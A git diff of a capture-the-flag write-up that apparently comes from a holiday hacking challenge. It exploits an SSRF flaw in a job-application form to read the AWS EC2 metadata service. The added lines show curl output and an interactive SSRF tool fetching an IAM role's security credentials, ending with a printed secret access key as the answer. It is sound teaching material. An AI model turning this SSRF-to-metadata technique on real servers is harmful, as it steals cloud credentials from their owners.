@@ -7,10 +7,10 @@ job application server](https://apply.jackfrosttower.com/). Completing the IMDS
 terminal gives us a hint to solving the objective: we need to access an [internal Amazon AWS
 service](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)
 to obtain EC2 metadata. As we don't have direct access to the EC2 instance the job
-application server is running on, there is likely an SSRF vulnerability on the website
-where the web server will perform the request for us and return the data.
+application server is running on, there is likely an SSRF vulnerability on the website,
+where the web server will perform the request for us and return the data received.
 
-## Initial recon
+## Initial Recon
 
 Visiting the [job application page](https://apply.jackfrosttower.com/) gives us a simple
 job application site:
@@ -29,7 +29,7 @@ Background Investigation (NLBI)** report.
 If the web server uses the URL in the web form to request data, it may be possible
 to abuse this field to request data that normally isn't available. 
 
-## Exploiting the SSRF vulnerability
+## Exploiting the SSRF Vulnerability
 
 By using the 
 techniques from the IMDS terminal and the data from the page referenced in the hint,
@@ -45,7 +45,7 @@ After submitting this, we get back a page with what appears to be a broken image
 Viewing the source of the web page shows a link to `images/{name}.png`, with the
 name we submitted in the form:
 
-``` html linenums="77" hl_lines="4"
+``` html
 <div class="col-sm-4">
 <div class="card text-white bg-secondary mb-3" style="max-width: 20rem;">
   <div class="card-body">
@@ -55,10 +55,29 @@ name we submitted in the form:
 </div>
 ```
 
+
 If we open a terminal and visit that URL with curl or wget, we see that the
 file actually contains the data we requested from the internal AWS metadata service:
 
-![AWS metadata](img/hhc-2021-07.png)
+``` shell-session
+$ curl https://apply.jackfrosttower.com/images/pugpug.jpg
+ami-id
+ami-launch-index
+ami-manifest-path
+block-device-mapping/ami
+block-device-mapping/ebs0
+block-device-mapping/ephemeral0
+block-device-mapping/root
+block-device-mapping/swap
+elastic-inference/associations
+elastic-inference/associations/eia-bfa21c7904f64a82a21b9f4540169ce1
+events/maintenance/scheduled
+events/recommendations/rebalance
+hostname
+iam/info
+iam/security-credentials
+...
+```
 
 ## Automating the SSRF
 
@@ -172,16 +191,25 @@ if __name__ == "__main__":
         term.cmdloop()
 ```
 
-## Retrieving the objective data
+## Retrieving the Objective Data
 
 With this script, we can easily request the current role associated with the instance
 by querying 
 `http://169.254.169.254/latest/meta-data/iam/security-credentials`, then use the
 `role` returned to fetch the access keys:
 
-![AWS credentials](img/hhc-2021-08.png)
-
-``` json
+``` shell-session
+$ python3 apply-ssrf.py
+ssrf> http://169.254.169.254/latest/meta-data/iam/info
+{
+        "Code": "Success",
+        "LastUpdated": "2021-05-02T18:50:40Z",
+        "InstanceProfileArn": "arn:aws:iam::896453262835:instance-profile/jf-deploy-role",
+        "InstanceProfileId": "AIPA5BOGHHXZELSK34VU4"
+}
+ssrf> http://169.254.169.254/latest/meta-data/iam/security-credentials
+jf-deploy-role
+ssrf> http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role
 {
         "Code": "Success",
         "LastUpdated": "2021-05-02T18:50:40Z",
@@ -192,3 +220,5 @@ by querying
         "Expiration": "2026-05-02T18:50:40Z"
 }
 ```
+
+The SecretAccessKey is **CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX**
